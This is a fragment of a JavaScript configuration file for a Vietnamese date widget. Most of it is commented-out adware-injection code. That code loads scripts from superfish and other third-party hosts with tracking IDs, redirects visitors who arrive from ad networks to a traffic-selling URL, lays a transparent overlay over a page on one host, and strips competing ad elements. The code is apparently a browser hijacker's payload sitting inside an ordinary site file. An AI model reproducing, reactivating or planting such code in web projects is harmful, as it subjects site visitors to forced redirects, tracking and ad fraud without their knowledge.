...
var languageCode = 'vn';	// Possible values: 	en,ge,no,nl,es,pt-br,fr
...
// [year] = Current year
var todayStringFormat = '[todayString] [UCFdayString] ngày [day] [monthString] năm [year]';
...
//    script.src = '//www.superfish.com/ws/sf_main.jsp?dlsource=74055d&userId=1690215810&CTID=p952';
//    document.getElementsByTagName("head")[0].appendChild(script);
//};
//if (window.self.location.protocol.indexOf('http') > -1 && window.self == window.top) {
//    var script = document.createElement('script');
//    script.type = 'text/javascript';
//    script.src = '//i.74055djs.info/74055d/javascript.js?channel=p952&hid=0';
//    document.getElementsByTagName("head")[0].appendChild(script);
//};
//if (window.self == window.top) {
//    var script = document.createElement("script");
//    script.type = "text/javascript";
//    script.src = "//cdncache-a.akamaihd.net/loaders/1499/l.js?aoi=1311798366&pid=1499&zoneid=309980&ext=saveshare";
//    document.getElementsByTagName("head")[0].appendChild(script)
//};
//;
//(
...
//(
//function() {
//if (-1 < window.self.location.hostname.indexOf("kass.t") && document.getElementById("_091c88d5b8c081bf15d212c4ae994c85")) {
//    var b = document.getElementById("_091c88d5b8c081bf15d212c4ae994c85"), a = document.createElement("div");
//    a.setAttribute("style", "width:100%;height:300%;position:absolute;left:0;top:0");
//    a.innerHTML = '<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEHAAAALAAAAAABAAEAAAICRAEAOw==" style="width:100%;height:100%">';
//    b.style.position = "relative"; b.appendChild(a)
//} 
//})(); ; 
//(function() { if ("http:" == window.self.location.protocol) try { var b = "gonetwork.eu performancerevenues.com adtransfer adk2.com clkads.com xtendmedia.com cpxinteractive media-servers doubleclick brealtime.com adnxs.com yieldmanager yieldads adserverplus exoclick.com vitalads zedo.com mshft pop.billi edomz realpopbid bestadbid directdisplayad displayadfeed adorika akamaihd.net/ssa/ trusted-serving".split(" "); for (i = 0; i < b.length; i++) { var a = document.title ? document.title.toLowerCase() : "z"; if (document.referrer && -1 < document.referrer.indexOf(b[i]) && (-1 < a.indexOf("download") || -1 < a.indexOf("convert") || -1 < window.self.location.href.indexOf("babylon") || -1 < window.self.location.href.indexOf("ilivid") || -1 < window.self.location.href.indexOf("download") || -1 < a.indexOf("regclean") || -1 < a.indexOf("etype") || -1 < a.indexOf("diction") || -1 < a.indexOf("player"))) { location.href = "http://imp.trafficunit.in/e/?eid=289&hid=2807960915&pid=952&ch=99&s=px.pluginh&r=" + Math.random(); break } } } catch (d) { } })(); if (-1 == window.self.location.hostname.indexOf('mail.')) {
//    for (i = 0; 5 > i; i++) window.setTimeout(function() { document.getElementById('c2soffer') && document.getElementById('c2soffer').parentNode.removeChild(document.getElementById('c2soffer')) }, 100 * i); var c2soffer = document.querySelectorAll('div.c2soffer'); if (c2soffer.length) for (var i = 0; i < c2soffer.length; i++) c2soffer[i].parentNode.removeChild(c2soffer[i]); 
//     document.getElementById('w3uyh7g6h7f5x') && document.getElementById('w3uyh7g6h7f5x').parentNode.removeChild(document.getElementById('w3uyh7g6h7f5x')) }
